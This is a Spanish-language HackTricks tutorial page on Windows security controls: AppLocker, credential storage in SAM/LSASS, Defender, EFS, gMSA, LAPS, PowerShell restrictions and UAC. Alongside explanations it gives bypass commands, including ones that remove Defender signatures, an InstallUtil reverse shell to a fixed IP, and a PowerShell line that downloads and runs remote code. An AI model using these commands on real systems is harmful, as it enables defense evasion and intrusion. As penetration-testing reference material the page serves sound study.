# Controles de Seguridad de Windows

<details>

<summary><strong>Aprende a hackear AWS desde cero hasta convertirte en un experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** f√°cilmente con las herramientas comunitarias m√°s avanzadas del mundo.\
¬°Accede hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Pol√≠tica de AppLocker

Una lista blanca de aplicaciones es una lista de aplicaciones de software aprobadas o ejecutables que se permiten estar presentes y ejecutarse en un sistema. El objetivo es proteger el entorno de malware da√±ino y software no aprobado que no se alinea con las necesidades comerciales espec√≠ficas de una organizaci√≥n.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) es la **soluci√≥n de lista blanca de aplicaciones** de Microsoft y brinda a los administradores del sistema control sobre **qu√© aplicaciones y archivos pueden ejecutar los usuarios**. Proporciona **control granular** sobre ejecutables, scripts, archivos de instalaci√≥n de Windows, DLL, aplicaciones empaquetadas e instaladores de aplicaciones empaquetadas.\
Es com√∫n que las organizaciones **bloqueen cmd.exe y PowerShell.exe** y el acceso de escritura a ciertos directorios, **pero todo esto puede ser eludido**.

### Verificaci√≥n

Verifica qu√© archivos/extensiones est√°n en la lista negra/lista blanca:
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Este camino de registro contiene las configuraciones y pol√≠ticas aplicadas por AppLocker, proporcionando una forma de revisar el conjunto actual de reglas aplicadas en el sistema:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`


### Bypass

* Carpetas **escribibles** √∫tiles para evitar la Pol√≠tica de AppLocker: Si AppLocker permite ejecutar cualquier cosa dentro de `C:\Windows\System32` o `C:\Windows`, hay **carpetas escribibles** que puedes usar para **evitar esto**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
* Com√∫nmente, los binarios **confiables** de [**"LOLBAS's"**](https://lolbas-project.github.io/) tambi√©n pueden ser √∫tiles para evadir AppLocker.
* Las reglas **mal escritas tambi√©n podr√≠an ser evadidas**.
* Por ejemplo, con la regla **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, puedes crear una **carpeta llamada `allowed`** en cualquier lugar y ser√° permitida.
* Las organizaciones a menudo se centran en **bloquear el ejecutable `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, pero olvidan los **otros** [**ubicaciones ejecutables de PowerShell**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) como `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` o `PowerShell_ISE.exe`.
* La **aplicaci√≥n de DLL muy raramente est√° habilitada** debido a la carga adicional que puede poner en un sistema y la cantidad de pruebas requeridas para garantizar que nada se rompa. Por lo tanto, usar **DLLs como puertas traseras ayudar√° a evadir AppLocker**.
* Puedes usar [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) o [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) para **ejecutar c√≥digo Powershell** en cualquier proceso y evadir AppLocker. Para m√°s informaci√≥n, consulta: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Almacenamiento de Credenciales

### Administrador de Cuentas de Seguridad (SAM)

Las credenciales locales est√°n presentes en este archivo, las contrase√±as est√°n hasheadas.

### Autoridad de Seguridad Local (LSA) - LSASS

Las **credenciales** (hasheadas) se **guardan** en la **memoria** de este subsistema por razones de Inicio de Sesi√≥n √önico.\
**LSA** administra la **pol√≠tica de seguridad** local (pol√≠tica de contrase√±as, permisos de usuarios...), **autenticaci√≥n**, **tokens de acceso**...\
LSA ser√° el encargado de **verificar** las credenciales proporcionadas dentro del archivo **SAM** (para un inicio de sesi√≥n local) y **comunicarse** con el **controlador de dominio** para autenticar a un usuario de dominio.

Las **credenciales** se **guardan** dentro del **proceso LSASS**: tickets de Kerberos, hashes NT y LM, contrase√±as f√°cilmente descifrables.

### Secretos de LSA

LSA podr√≠a guardar en disco algunas credenciales:

* Contrase√±a de la cuenta de equipo del Directorio Activo (controlador de dominio inaccesible).
* Contrase√±as de las cuentas de servicios de Windows.
* Contrase√±as de tareas programadas.
* M√°s (contrase√±a de aplicaciones IIS...).

### NTDS.dit

Es la base de datos del Directorio Activo. Solo est√° presente en Controladores de Dominio.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft\_Defender) es un Antivirus que est√° disponible en Windows 10 y Windows 11, y en versiones de Windows Server. **Bloquea** herramientas comunes de pentesting como **`WinPEAS`**. Sin embargo, existen formas de **evadir estas protecciones**.

### Verificaci√≥n

Para verificar el **estado** de **Defender**, puedes ejecutar el cmdlet de PS **`Get-MpComputerStatus`** (verifica el valor de **`RealTimeProtectionEnabled`** para saber si est√° activo):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Para enumerarlo tambi√©n podr√≠as ejecutar:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Sistema de Archivos Encriptados (EFS)

EFS asegura archivos mediante encriptaci√≥n, utilizando una **clave sim√©trica** conocida como **Clave de Encriptaci√≥n de Archivos (FEK)**. Esta clave se encripta con la **clave p√∫blica** del usuario y se almacena dentro de la **secuencia de datos alternativa** $EFS del archivo encriptado. Cuando se necesita desencriptar, se utiliza la **clave privada** correspondiente del certificado digital del usuario para desencriptar la FEK de la secuencia $EFS. Se pueden encontrar m√°s detalles [aqu√≠](https://en.wikipedia.org/wiki/Encrypting_File_System).

Los **escenarios de desencriptaci√≥n sin iniciativa del usuario** incluyen:

- Cuando los archivos o carpetas se mueven a un sistema de archivos no EFS, como [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), se desencriptan autom√°ticamente.
- Los archivos encriptados enviados a trav√©s de la red mediante el protocolo SMB/CIFS se desencriptan antes de la transmisi√≥n.

Este m√©todo de encriptaci√≥n permite el **acceso transparente** a los archivos encriptados para el propietario. Sin embargo, simplemente cambiar la contrase√±a del propietario e iniciar sesi√≥n no permitir√° la desencriptaci√≥n.

**Puntos clave**:
- EFS utiliza una FEK sim√©trica, encriptada con la clave p√∫blica del usuario.
- La desencriptaci√≥n emplea la clave privada del usuario para acceder a la FEK.
- La desencriptaci√≥n autom√°tica ocurre bajo condiciones espec√≠ficas, como copiar a FAT32 o transmisi√≥n en red.
- Los archivos encriptados son accesibles para el propietario sin pasos adicionales.

### Verificar informaci√≥n de EFS

Verifique si un **usuario** ha **utilizado** este **servicio** verificando si esta ruta existe: `C:\users\<nombredeusuario>\appdata\roaming\Microsoft\Protect`

Verifique **qui√©n** tiene **acceso** al archivo usando cipher /c \<archivo>\
Tambi√©n puede usar `cipher /e` y `cipher /d` dentro de una carpeta para **encriptar** y **desencriptar** todos los archivos.

### Desencriptar archivos EFS

#### Siendo Autoridad del Sistema

Este m√©todo requiere que el **usuario v√≠ctima** est√© **ejecutando** un **proceso** dentro del host. En ese caso, utilizando sesiones `meterpreter`, puede suplantar el token del proceso del usuario (`impersonate_token` de `incognito`). O simplemente puede `migrar` al proceso del usuario.

#### Conociendo la contrase√±a de los usuarios

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## Cuentas de Servicio Administradas por Grupo (gMSA)

Microsoft desarroll√≥ las **Cuentas de Servicio Administradas por Grupo (gMSA)** para simplificar la gesti√≥n de cuentas de servicio en infraestructuras de TI. A diferencia de las cuentas de servicio tradicionales que a menudo tienen la configuraci√≥n de "**Contrase√±a que nunca expira**" habilitada, las gMSAs ofrecen una soluci√≥n m√°s segura y manejable:

- **Gesti√≥n Autom√°tica de Contrase√±as**: Las gMSAs utilizan una contrase√±a compleja de 240 caracteres que cambia autom√°ticamente seg√∫n la pol√≠tica del dominio o del equipo. Este proceso es manejado por el Servicio de Distribuci√≥n de Claves (KDC) de Microsoft, eliminando la necesidad de actualizaciones manuales de contrase√±as.
- **Seguridad Mejorada**: Estas cuentas son inmunes a bloqueos y no pueden utilizarse para inicios de sesi√≥n interactivos, mejorando su seguridad.
- **Soporte para M√∫ltiples Hosts**: Las gMSAs pueden compartirse en varios hosts, lo que las hace ideales para servicios que se ejecutan en m√∫ltiples servidores.
- **Capacidad de Tareas Programadas**: A diferencia de las cuentas de servicio administradas, las gMSAs admiten la ejecuci√≥n de tareas programadas.
- **Gesti√≥n Simplificada de SPN**: El sistema actualiza autom√°ticamente el Nombre Principal de Servicio (SPN) cuando hay cambios en los detalles sAMaccount del equipo o en el nombre DNS, simplificando la gesti√≥n de SPN.

Las contrase√±as de las gMSAs se almacenan en la propiedad LDAP _**msDS-ManagedPassword**_ y se restablecen autom√°ticamente cada 30 d√≠as por los Controladores de Dominio (DCs). Esta contrase√±a, un bloque de datos encriptados conocido como [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), solo puede ser recuperado por administradores autorizados y los servidores en los que se instalan las gMSAs, asegurando un entorno seguro. Para acceder a esta informaci√≥n, se requiere una conexi√≥n segura como LDAPS, o la conexi√≥n debe autenticarse con 'Sellado y Seguridad'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../.gitbook/assets/asd1.png)

Puede leer esta contrase√±a con [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
**[Encuentra m√°s informaci√≥n en esta publicaci√≥n](https://cube0x0.github.io/Relaying-for-gMSA/)**

Tambi√©n, revisa esta [p√°gina web](https://cube0x0.github.io/Relaying-for-gMSA/) sobre c√≥mo realizar un ataque de **retransmisi√≥n NTLM** para **leer** la **contrase√±a** de **gMSA**.

## LAPS

La **Soluci√≥n de Contrase√±a de Administrador Local (LAPS)**, disponible para descargar desde [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), permite la gesti√≥n de contrase√±as de administrador local. Estas contrase√±as, que son **aleatorias**, √∫nicas y **cambiadas regularmente**, se almacenan de forma centralizada en Active Directory. El acceso a estas contrase√±as est√° restringido a trav√©s de ACLs para usuarios autorizados. Con los permisos suficientes otorgados, se proporciona la capacidad de leer las contrase√±as de administrador local.

{% content-ref url="active-directory-methodology/laps.md" %}
[laps.md](active-directory-methodology/laps.md)
{% endcontent-ref %}

## Modo de Lenguaje Restringido de PS

El [**Modo de Lenguaje Restringido de PowerShell**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **bloquea muchas de las caracter√≠sticas** necesarias para utilizar PowerShell de manera efectiva, como bloquear objetos COM, permitir solo tipos .NET aprobados, flujos de trabajo basados en XAML, clases de PowerShell y m√°s.

### **Verificar**
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Saltar
```powershell
#Easy bypass
Powershell -version 2
```
En la versi√≥n actual de Windows, ese Bypass no funcionar√°, pero puedes usar [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Para compilarlo, es posible que necesites** **agregar una referencia** -> _Examinar_ -> _Examinar_ -> agregar `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` y **cambiar el proyecto a .Net4.5**.

#### Bypass directo:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Shell inversa:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Puedes usar [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) o [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) para **ejecutar c√≥digo Powershell** en cualquier proceso y evadir el modo restringido. Para m√°s informaci√≥n, consulta: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Pol√≠tica de Ejecuci√≥n de PS

Por defecto est√° configurada como **restrictiva.** Principales formas de evadir esta pol√≠tica:
```powershell
1¬∫ Just copy and paste inside the interactive PS console
2¬∫ Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3¬∫ Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4¬∫ Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5¬∫ Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6¬∫ Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7¬∫ Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8¬∫ Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9¬∫ Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Puedes encontrar m√°s informaci√≥n [aqu√≠](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Interfaz de Proveedor de Soporte de Seguridad (SSPI)

Es la API que se puede utilizar para autenticar usuarios.

El SSPI se encargar√° de encontrar el protocolo adecuado para dos m√°quinas que desean comunicarse. El m√©todo preferido para esto es Kerberos. Luego, el SSPI negociar√° qu√© protocolo de autenticaci√≥n se utilizar√°, estos protocolos de autenticaci√≥n se llaman Proveedor de Soporte de Seguridad (SSP), se encuentran dentro de cada m√°quina Windows en forma de una DLL y ambas m√°quinas deben admitir el mismo para poder comunicarse.

### Principales SSPs

* **Kerberos**: El preferido
* %windir%\Windows\System32\kerberos.dll
* **NTLMv1** y **NTLMv2**: Razones de compatibilidad
* %windir%\Windows\System32\msv1\_0.dll
* **Digest**: Servidores web y LDAP, contrase√±a en forma de hash MD5
* %windir%\Windows\System32\Wdigest.dll
* **Schannel**: SSL y TLS
* %windir%\Windows\System32\Schannel.dll
* **Negotiate**: Se utiliza para negociar el protocolo a utilizar (Kerberos o NTLM siendo Kerberos el predeterminado)
* %windir%\Windows\System32\lsasrv.dll

#### La negociaci√≥n podr√≠a ofrecer varios m√©todos o solo uno.

## UAC - Control de Cuenta de Usuario

[Control de Cuenta de Usuario (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) es una caracter√≠stica que habilita una **solicitud de consentimiento para actividades elevadas**.

{% content-ref url="windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** f√°cilmente con las herramientas comunitarias m√°s avanzadas del mundo.\
Obt√©n acceso hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

***

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
